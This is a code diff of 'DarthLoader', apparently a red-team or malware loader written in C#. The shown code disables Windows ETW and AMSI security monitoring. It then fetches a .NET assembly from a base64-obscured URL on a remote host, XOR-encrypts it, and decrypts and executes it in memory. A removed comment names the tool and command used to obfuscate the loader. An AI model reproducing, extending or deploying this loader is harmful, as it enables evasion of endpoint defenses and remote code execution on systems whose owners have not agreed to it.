@@ -1,6 +1,3 @@
-﻿// obfuscation:
-// python .\ProtectMyTooling.py asstrongasfuck,confuserex "D:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release\DarthLoader.exe" D:\test.exe
-
 using System.Net;
 using System.Reflection;
 using System;
@@ -11,6 +8,7 @@ namespace DarthLoader
 {
     class Program
     {
+        // download a .Net assembly and xor encrypt the bytes
         static byte[] PrepareRemoteAssembly(string url, int count, string xorKey = "")
         {
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
@@ -54,13 +52,13 @@ namespace DarthLoader
             try
             {
                 string key = args[0];
-                string count = args[1];
+                string retryCount = args[1];
 
                 Utilities.BypassETW();
                 Utilities.BypassAMSI();
 
                 Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {key}");
-                byte[] programBytes = PrepareRemoteAssembly(Utilities.Base64Decode("aHR0cDovLzEwLjEwLjEuNDAvdXBkYXRlLmV4ZQ=="), Int32.Parse(count), key);
+                byte[] programBytes = PrepareRemoteAssembly(Utilities.Base64Decode("aHR0cDovLzEwLjEwLjEuNDAvdXBkYXRlLmV4ZQ=="), Int32.Parse(retryCount), key);
                 Console.WriteLine("[!] .Net assembly downloaded!");
 
                 Console.WriteLine("[*] Decrypting and executing assembly...");
